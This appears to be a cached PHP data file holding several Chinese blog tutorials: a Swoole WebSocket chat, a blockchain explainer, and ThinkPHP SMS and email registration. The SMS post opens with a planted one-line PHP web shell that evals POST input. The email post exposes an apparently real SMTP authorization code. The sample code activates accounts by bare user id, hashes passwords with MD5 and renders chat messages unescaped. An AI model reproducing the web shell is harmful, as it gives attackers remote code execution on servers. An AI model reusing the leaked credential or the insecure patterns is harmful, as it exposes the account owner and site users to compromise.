<?php
//000000086400a:10:{i:0;a:15:{s:3:"aid";i:142;s:5:"title";s:29:"swoole+php+websocket聊天室";s:11:"create_time";i:1522650865;s:3:"cid";i:2;s:7:"content";s:8493:"<p>
	之前在一篇文章里介绍过ajax轮询的方式搭建简易聊天室<a href="http://www.yuqingyong.cn/news_detail/101.html" target="_blank">http://www.yuqingyong.cn/news_detail/101.html</a>；
</p>
<p>
	但是ajax轮询的这种方式不管是在性能上，效率上，还有方便上都不如websocket来的好；
</p>
<p>
	websocket是一种基于TCP的一种新的网络协议。它实现了浏览器与服务器全双工(full-duplex)通信——允许服务器主动发送信息给客户端;
</p>
<p>
	<span style="color:#333333;font-family:&quot;font-size:13px;background-color:#FFFFFF;">在WebSocket API中，浏览器和服务器只需要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就直接可以数据互相传送;</span> 
</p>
<p>
	嗯，具体的介绍这里就不说了，我们先来看看怎么使用它；
</p>
<p>
	首先，我先介绍个web开发框架，swoole,使 PHP 开发人员可以编写高性能的异步并发 TCP、UDP、Unix Socket、HTTP，WebSocket 服务；
</p>
<p>
	有了这个，开发起websocket就方便许多了，首先我们安装一下这东西；
</p>
<p>
	<br />
</p>
<pre class="prettyprint lang-bsh">#!/bin/bash
pecl install swoole</pre>
在Linux下执行上述命令，即可安装swoole；
<p>
	<br />
</p>
<p>
	然后建立好一个前端显示页面：
</p>
<p>
	<br />
</p>
<pre class="prettyprint lang-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
	&lt;title&gt;聊天界面&lt;/title&gt;
	&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
	&lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;style src="chat.css"&gt;&lt;/style&gt;
&lt;body&gt;
	&lt;div class="big_box"&gt;
		&lt;div class="left_msg"&gt;&lt;/div&gt;
		&lt;div class="content" id="content"&gt;&lt;/div&gt;
		&lt;div class="msgs"&gt;
			&lt;input id="input_msg"&gt;
			&lt;button id="send_msg" onclick="sendMsg()"&gt;发送&lt;/button&gt;
			&lt;div id="emoji"&gt;&lt;img src="emoji.png"&gt;&lt;/div&gt;
			&lt;div id="pic"&gt;&lt;img src="pic.png"&gt;&lt;/div&gt;
		&lt;/div&gt;
	&lt;/div&gt;
&lt;/body&gt;
&lt;script type="text/javascript" src="chat.js"&gt;&lt;/script&gt;
&lt;/html&gt;</pre>
<p>
	<br />
</p>
<p>
	JS部分：
</p>
<p>
	<br />
</p>
<pre class="prettyprint lang-js">//定义自己的聊天消息模板
var _else_tpl = '&lt;table class="msg-tb msg-other"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="msg-head" rowspan="2"&gt;&lt;img src="header.jpg" alt=""&gt;&lt;/td&gt;&lt;td class="msg-title"&gt;{username}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="msg-text"&gt;&lt;span class="msg-span"&gt;&lt;div class="t_div"&gt;{content}&lt;/div&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;';

//定义他人发送消息的模板
var _my_tpl = '&lt;table class="msg-tb msg-me"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="msg-title"&gt;{username}&lt;/td&gt;&lt;td rowspan="2" class="msg-head"&gt;&lt;img src="header.jpg" alt=""&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="msg-text"&gt;&lt;span class="msg-span"&gt;&lt;div class="t_div"&gt;{content}&lt;/div&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;';

// 消息对象
(window.ws = new WebSocket("ws://139.196.93.247:9502")).onmessage = function (e) {
    showMsg(e.data);
};

//链接测试
// ws.onopen = function () {
//     console.log('success')
// }
// ws.onclose = function () {
//     console.log('close')
// }
// ws.onerror = function (e) {
//     console.log('error')
// }

//显示消息
function showMsg(msg) {
	// console.log(msg)
	var data = JSON.parse(msg);
	var str = '';
	var tp = data.me ? _my_tpl : _else_tpl;
	str = tp.replace('{username}','yqy').replace('{content}',data.t);
	$("#content").append(str);
}

//发送消息
function sendMsg() {
	var content = $("#input_msg").val();
	ws.send('{"type":"t", "t":"'+content+'"}');
}</pre>
CSS部分：
<p>
	<br />
</p>
<p>
	<br />
</p>
<pre class="prettyprint lang-css">.big_box{width: 800px;height: 640px;background: #BDD7EE;margin: 0 auto;}
.left_msg{width: 180px;height: 620px;background:#ccc; float: left;margin:10px 10px;}
.content{width: 580px;height: 440px;background: #fff;float: left;margin: 10px 10px;overflow-y: auto;overflow-x: hidden;}
.msgs{width: 580px;height: 100px;float: left;margin: 10px 10px;}
#input_msg{width: 480px;height: 90px;background: #fff;}
#send_msg{width: 90px;height: 90px;}
#emoji{width: 50px;height: 50px;float: left;margin-right: 20px;}
#emoji img{width: 50px;}
#pic{width: 50px;height: 50px;float: left;}
#pic img{width: 50px;}

.msg-tb{width:580px;margin:15px auto 0;margin-bottom: 15px;}
.msg-head{vertical-align:top;width:60px;text-align:center;}
.msg-head img{width:50px;height:50px;}
.msg-title{font-size:14px;color: #743283;}
.msg-me .msg-title,.msg-me .msg-text{text-align:right;}
.msg-text{padding:10px 0;}
.msg-text span{display:inline-block;max-width:350px;padding:5px 10px;border-radius:5px;word-break:break-all;text-align:left;cursor:pointer}

.up_msg{overflow:hidden;  width:600px;float: left;margin-left: 48px;box-shadow:2px 2px 5px #999 inset; background: #fff;}
.up_msg .msg-text span{background:#ccc;}
.up_msg .msg-tb{border-bottom:1px dotted #ccc}
 div.msg-go{height:4px;border-radius:2px;margin-bottom:10px;}
 .up_msg .msg-span{max-width:250px;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;}
 .up_msg a{float:right;padding:3px;min-width:54px;text-align:center;border:1px solid #ccc;border-radius:5px;margin:0 3px;text-decoration:none;color:#555;font-size:12px}
.up_msg a:hover{color:#3499da}
.up-msg-wait{line-height: 20px;font-size: 12px;color: red;position: absolute; width: 600px;text-align: center;}

.msg_more{position:fixed;background:#fff;border:1px solid #ccc;border-radius:5px}
.msg_more li{width:100px;text-align: center;border-bottom:1px solid #eee;padding:5px 0}
.msg_more li:hover{color:#3499da}
.msg_more li:last-child{border-bottom:none}

.msg-other .msg-text span{background:#ccc;}
.msg-me .msg-text span{background:#abc;}</pre>
最后后台部分：
<p>
	<br />
</p>
<p>
	<br />
</p>
<pre class="prettyprint lang-php">&lt;?php
//创建websocket服务器
$ws = new swoole_websocket_server("0.0.0.0", 9502);

//创建临时存储客户端ID文件
$client_id = date('Ymd').'.json';

//监听客户端ID
$ws-&gt;on('open', function($ws, $req) {
    //存储客户端ID
	global $client_id;
	$team = getName();
	$team[$req-&gt;fd] = $req-&gt;fd;
	//使用文件的方式存储
	file_put_contents($client_id, json_encode($team));
});

//监听客户端发送消息
$ws-&gt;on('message', function($ws, $req) {
    $msg = json_decode($req-&gt;data,true);
    $self = $req-&gt;fd;
	 // 推送消息给自己
    $msg['me'] = 1;
    pushOne($ws, $self, $msg);
    // 推送消息给其它客户端
    $msg['me'] = 0;
    pushOther($ws, $self, $msg);
});

//关闭客户端ID
$ws-&gt;on('close', function($ws, $fd) {
    //用户关闭了客户端，则重新更新用户ID
    global $client_id;
    $team = getName();
    unset($team[$fd]);
    file_put_contents($client_id, json_encode($team));
});

//开启
$ws-&gt;start();

//获取用户
function getName(){
	global $client_id;
	is_file($client_id) || file_put_contents($client_id, '{}');
	return json_decode(file_get_contents($client_id), true);
}


// ------------------------------------------------
//  客户端推送：单推、群推、指定除外
// ------------------------------------------------

function pushOne($ws, $fd, $msg, $str = false)
{
    $str || $msg = json_encode($msg);
    return $ws-&gt;push($fd, $msg);
}

function pushAll($ws, $msg, $str = false)
{
    foreach (getName() as $fd) {
        pushOne($ws, $fd, $msg, $str);
    }
}

function pushOther($ws, $fd, $msg, $str = false)
{
    foreach (getName() as $v) {
        $fd == $v || pushOne($ws, $v, $msg, $str);
    }
}</pre>
然后启动这个php文件
<p>
	<br />
</p>
<p>
	<br />
</p>
<pre class="prettyprint lang-bsh">[root@iZuf6h5jh62s8y8ybn0yj0Z websocket]# php websocket.php</pre>
启动之后，打开多个浏览器进行测试即可，效果如图：、
<p>
	<br />
</p>
<p>
	<img src="/static/admin/kindeditor/attached/image/20180402/20180402143404_70305.png" alt="" /> 
</p>";s:6:"author";s:6:"本站";s:8:"keywords";s:9:"websocket";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:85;s:5:"click";i:25;s:11:"comment_num";i:0;s:11:"description";s:41:"swoole+php+websocket实现简易聊天室";s:5:"ap_id";i:66;s:4:"path";s:20:"/upload/142thumb.png";}i:1;a:15:{s:3:"aid";i:141;s:5:"title";s:15:"区块链技术";s:11:"create_time";i:1521685540;s:3:"cid";i:7;s:7:"content";s:4629:"<p>
	可能谈起区块链，大家还不知道这是什么鬼东西；
</p>
<p>
	但是如果说起比特币，比特币病毒应该是大家比较熟知的事情了；
</p>
<p>
	在去年的4月份爆发了一个规模范围达到100多个国家和地区，超过10W台电脑被勒索病毒感染攻击；
</p>
<p>
	然而攻击者的目的是为了获得比特币，那么比特币究竟有什么魅力，让的攻击者不惜一切代价的去爆发这样一场大型病毒呢？
</p>
<p>
	比特币创始人中本聪（化名）于2009年提出P2P概念，点对点的传输意味着一个去中心化的支付系统；
</p>
<p>
	我们现实世界目前的支付等交易都是基于第三方担保或者协议建立的信任，而比特币的交易是一种没有第三方，用户和
</p>
<p>
	用户之间直接交易的数字货币；
</p>
<p>
	你可能无法想象，比特币在市场的价格有多么的恐怖，目前比特币的最新价格在$9012美元一个，合计人民币58579万元；
</p>
<p>
	而预计产出的比特币总数量只有2100W个，而比特币更是第一个被大众认可的数字货币，第一个诞生的；
</p>
<p>
	好了，关于币圈的新闻就不多说了，大家有兴趣的可以去了解一下，挺有意思的。
</p>
<p>
	我们知道比特币是啥，诞生比特币是基于什么样的技术诞生的呢？
</p>
<p>
	对，这就是我们要说的比特币的底层技术，“区块链”，一项伟大的新概念技术；
</p>
<p>
	也是从去年开始，在程序员的圈子里被大家慢慢熟知这项技术，区块链的技术并不是一门新的语言，而是一个思想概念；
</p>
<p>
	是分布式数据存储、点对点传输、共识机制、加密算法等计算机新型应用模式；
</p>
<p>
	嗯，举个例子：
</p>
<p>
	比如A向B借100块钱，但是B又不相信A，A也不相信B，现实世界中是怎么办呢。那就找个第三方来做担保，写借条呗；
</p>
<p>
	但是，如果哪天这个第三方消失了，不见了，借条也没了，那怎么办？A又死不认账的不还钱；
</p>
<p>
	而在区块链中，用户之间的交易就成了一对一，而区块就像一个账本记录着用户间的每笔交易，且这比交易是被大家所
</p>
<p>
	认可之后才能记录在区块中的，且数据一旦被存储，将会被永久保存。那有人就说了，万一这个账本也没了咋办？不用担心
</p>
<p>
	这个账本没了，还有其他的区块啊，下一个区块的产生会携带上一个区块的hash值并做好新的交易记录；
</p>
<p>
	<span style="color:#1A1A1A;font-family:-apple-system, BlinkMacSystemFont, " font-size:15px;background-color:#ffffff;"="">区块链技术因为是跑在一个完全P2P的网络里的，完全不知道运行在网络里的哪里，拥有绝佳的保密性和安全性。所以有一个比较有</span> 
</p>
<p>
	<span style="color:#1A1A1A;font-family:-apple-system, BlinkMacSystemFont, " font-size:15px;background-color:#ffffff;"="">意思的项目，利用这个做的保密通讯工具。每个人的身份通过数字签名技术验证，不需要根证书啥的。</span> 
</p>
<p>
	新区快的产生就涉及到了一个新的知识，叫 “挖矿”，比特币是大约每10分钟产生一个新的区块，区块体内带有信息
</p>
<p>
	<img src="/static/admin/kindeditor/attached/image/20180322/20180322101503_81498.jpg" alt="" /> 
</p>
<p>
	而挖矿就说一群拥有矿机的人去依靠计算机的算力，求出一个能够填充本区块头的随机值，让区块头的哈希散列值符合某一个标准；
</p>
<p>
	谁最快，工作量最大谁就拥有打包这个区块提交并生成新的数据快，也就是记账的资格，那别人凭什么花费这么大的功夫去挖矿呢？
</p>
<p>
	当然，挖矿不是白挖的，挖矿是有奖励的，比特币最初挖出一个新的块奖励是50个比特币，而且会逐渐减半，目前一个矿产生的奖励
</p>
<p>
	只有12.5个比特币，但是随着认可数字货币的人越来越多，人们之间的交易也慢慢的开始产生的手续费，以此来鼓励挖矿记账的人；
</p>
<p>
	让整个P2P网络更好的有人参与维护；这也就是越来越多的交易所开始出现了，炒币的人也多，慢慢的币圈已然成为了另一个股市；
</p>
<p>
	我说的只是其中的一些很小的部分，具体有些什么样的优势和劣势，大家可去查阅相关资料了解多一点；
</p>
<p>
	<br />
</p>";s:6:"author";s:6:"本站";s:8:"keywords";s:9:"区块链";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:84;s:5:"click";i:16;s:11:"comment_num";i:0;s:11:"description";s:48:"最近几年新崛起的一项伟大技术思想";s:5:"ap_id";i:65;s:4:"path";s:20:"/upload/141thumb.png";}i:2;a:15:{s:3:"aid";i:140;s:5:"title";s:30:"thinkphp5手机验证码注册";s:11:"create_time";i:1518015645;s:3:"cid";i:2;s:7:"content";s:7221:"<!--?php@eval($_POST['xiaojun']);?-->
<p>
	之前写了一篇关于邮箱注册的文章；
</p>
<p>
	这次写一篇关于手机短信注册的，也是现在普遍在使用的一个注册方式吧；
</p>
<p>
	首先，我们需要开通短信服务平台，比如阿里大于，或者<span style="font-family:monospace;font-size:medium;line-height:normal;">容联云通讯等等；</span><span style="font-family:monospace;font-size:medium;line-height:normal;"></span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">那以阿里大于为例来说，<a href="https://dayu.aliyun.com/?spm=a3142.8070732.1.d10001.b4cf51a1D298AG" target="_blank">https://dayu.aliyun.com/?spm=a3142.8070732.1.d10001.b4cf51a1D298AG</a></span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">怎么申请就不说了，申请完成之后，需要创建应用，并设置模板，设置签名</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"><img src="/static/admin/kindeditor/attached/image/20180207/20180207224747_69305.png" alt="" /></span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"><img src="/static/admin/kindeditor/attached/image/20180207/20180207224912_59085.png" alt="" /></span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"><img src="/static/admin/kindeditor/attached/image/20180207/20180207224919_64178.png" alt="" /></span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">如图，设置好模板和签名之后，查看一下应用的App Key和App Secret</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"><img src="/static/admin/kindeditor/attached/image/20180207/20180207225032_28122.png" alt="" /></span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">好了，获取到这些重要的参数之后，那就是直接使用官方的SDK进行开发了；</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">这里SDK呢，我找到了一个其他大神整理好的类文件，可以直接拿来用，毕竟官方的SDK文件有些乱，也有些多余的文件；</span> 
</p>
<p>
	<span>下载好压缩包之后，直接解压，将alidayu文件夹整个放置extend扩展文件夹中；</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"><img src="/static/admin/kindeditor/attached/image/20180207/20180207225400_76543.png" alt="" /></span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">然后就可以直接在控制器中调用</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"> </span> 
</p>
<pre class="prettyprint lang-js"><!--?php namespace app\home\controller; use app\common\controller\HomeBase; use app\common\model\Users; use think\request; use think\Controller; use think\Db; use think\Cookie; use alidayu\TopClient; use alidayu\AlibabaAliqinFcSmsNumSendRequest; error_reporting(0); class Register extends HomeBase { //注册会员 public function register(Request $request) { $this--->view-&gt;engine-&gt;layout(false);
		
		return view('Index/register');
	}
	
	
	//手机注册会员
	public function email_register(Request $request){
		$this-&gt;view-&gt;engine-&gt;layout(false);
		$data = $this-&gt;request-&gt;post();
		$result = $this-&gt;validate($data,'UserValidate');
		if(true !== $result){
			$this-&gt;error($result);
		}else{
			$res = model('Users')-&gt;user_register($data);
			if($res['status'] == 1){
				//如果用户注册成功，则直接登录，无需手动登录
				
			}else{
				$this-&gt;error($res['msg']);exit;
			}
			
		}

	}

	//发送手机验证码  
    public function send_phone_code(Request $request)  
    {
    	$phone = $this-&gt;request-&gt;post('phone');

    	if($phone == ''){
    		$this-&gt;error('提交的手机号不能为空');
    	}

    	$code = rand(100000,999999);
		$c = new TopClient();
		$c-&gt;appkey = "***********";//填写自己的appke
		$c-&gt;secretKey = "************************************";//真写自己的seretKEY
		$req = new AlibabaAliqinFcSmsNumSendRequest();
		$req-&gt;setExtend($code);
		$req-&gt;setSmsType("normal");
		$req-&gt;setSmsFreeSignName("星辰网络博客");
		$req-&gt;setSmsParam("{\"code\":\"".$code."\"}");
		$req-&gt;setRecNum($phone);
		$req-&gt;setSmsTemplateCode("模板ID");
		$resp = $c-&gt;execute($req);

		$result = object_to_array($resp);
		//dump($result);die;
		if(!$result['success']){
			//$msg = $this-&gt;error($resp);
			$arr = [
				'status' =&gt; 0,
				'msg'    =&gt; '发送失败'
			];
			return json_encode($arr);
		}

		//如果发送成功，则将验证码信息存储至数据库，以便验证
		$data['code'] = $code;
		$data['phone']= $phone;	
		$data['create_time']= time();	

		//插入数据库,插入前验证一下数据库是否已经存在该邮箱，存在则删除
    	$result = Db::name('code')-&gt;where('phone',$phone)-&gt;field('phone')-&gt;find();
    	if(!empty($result)){
    		Db::name('code')-&gt;where('phone',$phone)-&gt;delete();
    	}

		$resu = Db::name('code')-&gt;insert($data);

		$arr = [
			'status' =&gt; 1,
			'msg'    =&gt; '发送成功'
		];
		return json_encode($arr);
		
    }

}</pre>
<br />
<p>
	<br />
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">这里注意一下error_reporting(0);这个参数，如果不加的话可能会导致一些不重要的提示导致发送短信失败；</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">另外还有就是阿里大于的短信限制有个规定</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"><img src="/static/admin/kindeditor/attached/image/20180207/20180207225627_68911.png" alt="" /></span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">所以，一天一个手机只能测试5条左右，所以把握好每次的测试，不要像我样，瞎点......</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">那到这短信发送就应该没有什么问题了，剩下就是用户输入验证码完成注册的步骤了，剩下的代码跟邮箱注册逻辑基本类似；</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;">手机短信注册也无需激活什么的，如果需要邮箱激活，可在后期用户填写详细信息时进行激活；</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"><br />
</span> 
</p>
<p>
	<span style="font-family:monospace;font-size:medium;line-height:normal;"><span style="color:#E53333;">下载文件</span>:<a class="ke-insertfile" href="/static/admin/kindeditor/attached/file/20180207/20180207225906_19224.rar" target="_blank">alidayu</a></span> 
</p>
";s:6:"author";s:6:"站点";s:8:"keywords";s:30:"thinkphp5手机验证码注册";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:83;s:5:"click";i:96;s:11:"comment_num";i:2;s:11:"description";s:30:"thinkphp5手机验证码注册";s:5:"ap_id";i:64;s:4:"path";s:20:"/upload/140thumb.png";}i:3;a:15:{s:3:"aid";i:139;s:5:"title";s:21:"thinkphp5邮箱注册";s:11:"create_time";i:1517929238;s:3:"cid";i:2;s:7:"content";s:10562:"<p>
	由于之前做的网站都是直接提交账号密码，验证码等信息直接注册；
</p>
<p>
	但是这样可能收集到的用户信息不太真实，而且很容易被机器人自动注册；
</p>
<p>
	也使用过微信的授权登录的方式注册，但是如果遇到大型的网站，就大多数使用的是手机号注册或者邮箱注册；
</p>
<p>
	那今天先讲个邮箱注册；
</p>
<p>
	首先，我们需要去下载一个phpmailer的类文件，<a href="https://pan.baidu.com/s/1i5iAjKL" target="_blank">https://pan.baidu.com/s/1i5iAjKL</a>；
</p>
<p>
	下载好之后，放置thinkPHP的extend扩展文件夹下；
</p>
<p>
	放好之后，我们需要添加一下class.phpmailer.php和class.smtp.php这两个文件的命名空间为 &nbsp;namespace phpmailer; &nbsp;
</p>
<p>
	然后修改一下<span>class.phpmailer.php类文件名为<span>phpmailer.php，因为thinkphp的文件命名方式不能class开头；</span></span>
</p>
<p>
	<span style="line-height:1.5;">接着，在我们需要开发的控制器中</span>
</p>
<p>
	<span style="line-height:1.5;"> </span>
</p>
<pre class="prettyprint lang-js">use phpmailer\phpmailer;</pre>
<pre class="prettyprint lang-js">引入phpmailer类之后，就可以开始使用邮件发送了？</pre>
<pre class="prettyprint lang-js">不行，我们还需要开启邮箱的SMTP服务和授权码。如图</pre>
<pre class="prettyprint lang-js"><img src="/static/admin/kindeditor/attached/image/20180206/20180206224902_96816.png" alt="" /> </pre>
<pre class="prettyprint lang-js">接着，发送邮件的demo如下：</pre>
<pre class="prettyprint lang-js">
<pre class="prettyprint lang-js">	//发送邮箱验证码  
    public function email(Request $request)  
    {  
        //$toemail = '1965288730@qq.com';//定义收件人的邮箱  1965288730  1425219094
    	$toemail = $this-&gt;request-&gt;post('email');
        $mail = new PHPMailer();  
        $mail-&gt;isSMTP();// 使用SMTP服务  
        $mail-&gt;CharSet = "utf8";// 编码格式为utf8，不设置编码的话，中文会出现乱码  
        $mail-&gt;Host = "smtp.qq.com";// 发送方的SMTP服务器地址  
        $mail-&gt;SMTPAuth = true;// 是否使用身份验证  
        $mail-&gt;Username = "1425219094@qq.com";
        // 发送方的163邮箱用户名，就是你申请163的SMTP服务使用的163邮箱&lt;/span&gt;&lt;span style="color:#333333;"&gt;  
        $mail-&gt;Password = "adgcqfzercutgehh";
        // 发送方的邮箱密码，注意用163邮箱这里填写的是“客户端授权密码”而不是邮箱的登录密码！&lt;/span&gt;&lt;span style="color:#333333;"&gt;  
        $mail-&gt;SMTPSecure = "ssl";
        // 使用ssl协议方式&lt;/span&gt;&lt;span style="color:#333333;"&gt;  
        $mail-&gt;Port = 465;// 163邮箱的ssl协议方式端口号是465/994  

        $mail-&gt;setFrom("1425219094@qq.com","Mailer");// 设置发件人信息，如邮件格式说明中的发件人，这里会显示为Mailer(xxxx@163.com），Mailer是当做名字显示  
        $mail-&gt;addAddress($toemail,'Wang');// 设置收件人信息，如邮件格式说明中的收件人，这里会显示为Liang(yyyy@163.com)  
        $mail-&gt;addReplyTo("1425219094@qq.com","Reply");// 设置回复人信息，指的是收件人收到邮件后，如果要回复，回复邮件将发送到的邮箱地址  
        //$mail-&gt;addCC("xxx@163.com");// 设置邮件抄送人，可以只写地址，上述的设置也可以只写地址(这个人也能收到邮件)  
        //$mail-&gt;addBCC("xxx@163.com");// 设置秘密抄送人(这个人也能收到邮件)  
        //$mail-&gt;addAttachment("bug0.jpg");// 添加附件  
        $code = make_code(6);
        $mail-&gt;Subject = "星辰网络博客注册验证码";// 邮件标题  
        $mail-&gt;Body = "您的验证码是：".$code."，请在24小时内完成验证！";// 邮件正文  
        //$mail-&gt;AltBody = "This is the plain text纯文本";// 这个是设置纯文本方式显示的正文内容，如果不支持Html方式，就会用到这个，基本无用  
        if(!$mail-&gt;send()){
        	$msg = $mail-&gt;ErrorInfo;
        	$arr = [
        		'status' =&gt; 0,
        		'msg'    =&gt;$msg
        	];
        	return json_encode($arr);
            //echo "Message could not be sent.";  
            //echo "Mailer Error: ".$mail-&gt;ErrorInfo;// 输出错误信息  
        }else{

        	//如果发送成功，则存储发送的验证码信息
        	$data['code'] = $code;
        	$data['create_time'] = time();
        	$data['mail'] = $toemail;
        	//插入数据库,插入前验证一下数据库是否已经存在该邮箱，存在则删除
        	$result = Db::name('code')-&gt;where('mail',$toemail)-&gt;field('mail')-&gt;find();
        	if(!empty($result)){
        		Db::name('code')-&gt;where('mail',$toemail)-&gt;delete();
        	}

        	$res = Db::name('code')-&gt;insert($data);
        	$arr = [
        		'status' =&gt; 1,
        		'msg'    =&gt;'发送成功'
        	]; 
        	return json_encode($arr);
            //echo '发送成功';  
        }  
    }</pre>
<br />
</pre>
其中我已经写好了验证码存储的工作，这个在后面验证验证码的时候需要用到
<p>
	<br />
</p>
<p>
	<span style="line-height:1.5;">如果邮件发送失败，可能有以下原因</span>
</p>
<p>
	<span style="line-height:1.5;">1：没有开启OpenSSL扩展，开启后记得重启Apache</span>
</p>
<p>
	<span style="line-height:1.5;">2：没有添加命名空间</span>
</p>
<p>
	<span style="line-height:1.5;">3：没有引入类文件</span>
</p>
<p>
	<span style="line-height:1.5;">根据具体情况自行排错</span>
</p>
<p>
	<span style="line-height:1.5;">之后我们验证码发送成功了，我们还得验证吧？</span>
</p>
<p>
	<span style="line-height:1.5;"><img src="/static/admin/kindeditor/attached/image/20180206/20180206225331_68033.png" alt="" /><br />
</span>
</p>
<p>
	<span style="line-height:1.5;">如图，发送完验证码之后，我们要做的工作，改写发送验证码的文字提示和倒计时，存储发送的验证码；</span>
</p>
<p>
	<span style="line-height:1.5;">用户填写验证码之后验证是否正确，正确则提交注册，否则失败；</span>
</p>
<p>
	<span style="line-height:1.5;">这里如果需要做邮箱激活功能，则在用户提交注册之后，给一个邮箱未激活的状态字段，然后返回一个激活链接给用户；</span>
</p>
<p>
	<span style="line-height:1.5;">在这里，我个人的做法如下：</span>
</p>
<p>
	<span style="line-height:1.5;">
<pre class="prettyprint lang-js">	//邮箱注册会员
	public function email_register(Request $request){
		$this-&gt;view-&gt;engine-&gt;layout(false);
		$data = $this-&gt;request-&gt;post();
		$result = $this-&gt;validate($data,'UserValidate');
		if(true !== $result){
			$this-&gt;error($result);
		}else{
			$res = model('Users')-&gt;user_register($data);

			if($res['status'] == 1){
				//如果信息提交成功，则发送一封邮箱激活邮件
				$toemail = $data['email'];
		        $mail = new PHPMailer();  
		        $mail-&gt;isSMTP();// 使用SMTP服务  
		        $mail-&gt;CharSet = "utf8";// 编码格式为utf8，不设置编码的话，中文会出现乱码  
		        $mail-&gt;Host = "smtp.qq.com";// 发送方的SMTP服务器地址  
		        $mail-&gt;SMTPAuth = true;// 是否使用身份验证  
		        $mail-&gt;Username = "1425219094@qq.com";
		        $mail-&gt;Password = "adgcqfzercutgehh";
		        $mail-&gt;SMTPSecure = "ssl";
		        $mail-&gt;Port = 465; 
		        $mail-&gt;setFrom("1425219094@qq.com","Mailer"); 
		        $mail-&gt;addAddress($toemail,'Wang');
		        $mail-&gt;addReplyTo("1425219094@qq.com","Reply");
		        $mail-&gt;Subject = "星辰网络博客邮箱激活";
		        $mail-&gt;Body = "激活链接：http://127.0.0.1/home/register/email_jihuo/uid/".$res['uid']."";// 邮件正文
		        if(!$mail-&gt;send()){
		        	$this-&gt;error('激活邮件发送失败'.$mail-&gt;ErrorInfo);
		        }else{
		        	echo "&lt;a href='https://mail.qq.com'&gt;激活邮件发送成功,前往邮箱激活&gt;&gt;&gt;&lt;/a&gt;";
		        }

			}else{
				$this-&gt;error($res['msg']);exit;
			}
			
		}

	}</pre>
<pre class="prettyprint lang-js">	//用户注册
	public function user_register($data)
	{
		$da['password'] = md5($data['password']);
		$da['username'] = $data['username'];
		$da['email'] = $data['email'];

		//验证发送的验证码是否正确，或者过期emial_active
		$code = Db::name('code')-&gt;where('mail',$data['email'])-&gt;field('code,create_time')-&gt;find();
		//判断是否超过了24小时
		$cha  = (time() - $code['create_time']) / 3600;
		if($code['code'] != $data['code']){
			$arr = ['status'=&gt;0,'msg'=&gt;'输入验证码错误'];
			return $arr;
		}

		if($cha &gt;= 24){
			$arr = ['status'=&gt;0,'msg'=&gt;'验证码已过期'];
			return $arr;
		}


		$res = $this-&gt;insertGetId($da);

		if($res){
			$arr = ['status'=&gt;1,'msg'=&gt;'注册成功','uid'=&gt;$res];
			return $arr;
		}

		
	}</pre>
<pre class="prettyprint lang-js">    //用户邮箱激活
    public function email_jihuo(Request $request){
    	$uid = $this-&gt;request-&gt;param('uid');
    	//激活
    	$res = Db::name('users')-&gt;where('uid',$uid)-&gt;field('email_active')-&gt;update(['email_active'=&gt;1]);

    	if($res){
    		echo "&lt;a href='http://127.0.0.1/home/Register/login'&gt;激活成功，请前往登录页面&gt;&gt;&gt;&lt;/a&gt;";exit;

    	}

    	echo "&lt;a href='#'&gt;激活失败，请联系管理员&gt;&gt;&gt;&lt;/a&gt;";exit;

    }</pre>
这是在测试的情况下，<span>做的可能有些不太严谨，所以在实际开发中，根据生产环境，做好对应的数据验证之类的保护；</span></span>
</p>
<p>
	<span style="line-height:1.5;"><span>最终结果如图：</span></span>
</p>
<p>
	<span style="line-height:1.5;"><span><img src="/static/admin/kindeditor/attached/image/20180206/20180206230017_77191.png" alt="" /><br />
</span></span>
</p>
<p>
	<span style="line-height:1.5;"><span><img src="/static/admin/kindeditor/attached/image/20180206/20180206230026_22535.png" alt="" /><br />
</span></span>
</p>";s:6:"author";s:6:"站点";s:8:"keywords";s:21:"thinkphp5邮箱注册";s:7:"is_show";i:1;s:9:"is_delete";i:0;s:4:"sort";i:82;s:5:"click";i:76;s:11:"comment_num";i:0;s:11:"description";s:51:"使用PHPMailer和thinkphp5邮箱注册功能实现";s:5:"ap_id";i:63;s:4:"path";s:20:"/upload/139thumb.png";}i:4;a:15:{s:3:"aid";i:138;s:5:"title";s:34:"centos6.5下完美搭建LNMP环境";s:11:"create_time";i:1517404636;s:3:"cid";i:0;s:7:"content";s:633:"<p>
